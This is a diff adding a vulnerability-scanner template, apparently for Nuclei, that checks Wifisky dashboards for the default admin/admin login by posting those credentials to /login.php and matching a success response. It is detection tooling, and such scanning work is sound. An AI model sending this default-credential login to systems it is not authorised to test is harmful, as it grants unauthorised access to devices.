@@ -1,0 +1,20 @@
+id: poc-yaml-wifisky-dashboard-weak-pass
+info:
+  name: Wifisky Dashboard Weak Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password
+http:
+  - raw:
+      - |
+        POST /login.php?action=login&type=admin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{"success":"true", "data":{"id":1}'
+        part: body
